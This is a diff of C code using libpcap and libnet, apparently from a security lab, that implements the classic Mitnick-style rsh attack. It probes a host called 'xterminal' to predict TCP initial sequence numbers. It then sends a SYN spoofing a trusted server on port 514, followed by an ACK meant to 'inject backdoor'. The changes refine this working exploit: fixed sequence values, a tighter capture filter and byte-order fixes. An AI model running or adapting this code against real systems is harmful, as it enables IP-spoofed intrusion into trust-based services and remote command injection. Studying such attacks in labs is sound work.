@@ -75,7 +75,7 @@ struct tcp_hdr {
 
 
 //function definitions
-uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip);
+uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip, uint32_t seq);
 int send_ack(uint16_t src_port, uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t xterm_ip, uint32_t my_seq, uint32_t ack);
 uint32_t compute_next_seq(uint32_t n1, uint32_t n2);
 
@@ -139,7 +139,7 @@ int main (void)
 	char *dev;																		// The device to sniff, eth0?
 	char errbuf[PCAP_ERRBUF_SIZE];								// Error string
 	struct bpf_program fp;												// The compiled filter
-	char filter_exp[] = "src host xterminal";			// The filter expression, only packets that I receive from xterminal
+	char filter_exp[] = "src host xterminal and (tcp[tcpflags] & (tcp-syn | tcp-ack) != 0)";			// The filter expression, only packets that I receive from xterminal
 	bpf_u_int32 mask;															// Netmask
 	bpf_u_int32 net;															// kevin IP
 	struct pcap_pkthdr header;										// pcap header
@@ -182,21 +182,23 @@ int main (void)
 
 	//probe xterminal
 	uint32_t seq_array[3]; //actually I onlly need 2
+	uint32_t seqn = 100000;
 
+	//PROBE:
 	printf("Starting probing\n");
 	for (i = 0; i < 3; i++)
 	{
 		//printf("probe\n");
 		//send syn packets to shell in xterm, with kevin ip, to read the real synack and compute next sequence number
-		send_syn(514, 514 + (uint16_t )i + 1, NULL, 0, l, xterm_ip, kevin_ip);
+		send_syn(514, 514 + (uint16_t )i + 1, NULL, 0, l, xterm_ip, kevin_ip, seqn + 3000*i);
 		usleep(1000);
 		packet = pcap_next(handle, &header);
 
 		ip_hdr = (struct ip_hdr *) (packet + SIZE_ETH);
 		tcp_hdr = (const struct tcp_hdr *) (packet + SIZE_ETH + sizeof(struct ip_hdr));
 
-		tcp_seq seq = htonl(tcp_hdr->th_seq);
-		tcp_seq ack = htonl(tcp_hdr->th_ack);
+		uint32_t seq = ntohl(tcp_hdr->th_seq);
+		uint32_t ack = ntohl(tcp_hdr->th_ack);
 		//usleep(1000);
 		printf("seq %u, ack %u\n", seq, ack);
 		seq_array[i] = (uint32_t) seq;
@@ -208,7 +210,14 @@ int main (void)
 
 	//compute nextseq
 	printf("predictions\n");
-	printf("%u\n", compute_next_seq(seq_array[1], seq_array[0]) -1);
+	uint32_t check = compute_next_seq(seq_array[1], seq_array[0]) -1;
+	printf("%u\n", check);
+
+	//if (check != seq_array[2])
+	//{
+	//	printf("repeating probe\n");
+	//	goto PROBE;
+	//}
 
 	uint32_t predicted_seq = compute_next_seq(seq_array[2], seq_array[1]);
 	printf("predicted next seq %lu\n", predicted_seq);
@@ -216,7 +225,8 @@ int main (void)
 
 	//send syn impersonating the server
 	//as per manpage rshd, port of the client shound be within a range 512-1024 otherwise the connection is reset
-	uint32_t my_seq = send_syn(514, 514, NULL, 0, l, xterm_ip, server_ip);
+	uint32_t my_seq = 42424242;
+	send_syn(514, 514, NULL, 0, l, xterm_ip, server_ip, my_seq);
 	printf("sent spoofed syn with seq %u, waiting a second\n", my_seq);
 	sleep(1);
 	//send ack with predicted seq and inject backdoor
@@ -235,17 +245,17 @@ int main (void)
 }
 
 
-uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip)
+uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip, uint32_t seq)
 {
 
 	libnet_ptag_t t;
 	//build syn
-	uint32_t my_seq = libnet_get_prand(LIBNET_PRu32);
+	//uint32_t my_seq = libnet_get_prand(LIBNET_PRu32);
 
 	t = libnet_build_tcp(
 		src_port, //sp source port
 		dest_port,											//dp destinatin port
-		my_seq, //sequence number
+		seq, //sequence number
     0, 															//ack number, can I send whatever?
     TH_SYN,													//control bit SYN
 		2048, 													//window size, random is ok?
@@ -300,7 +310,7 @@ uint32_t send_syn(uint16_t dest_port, uint16_t src_port,uint8_t *payload, uint32
 	}
 
 	libnet_clear_packet(l);
-	return my_seq;
+	return seq;
 }
 
 
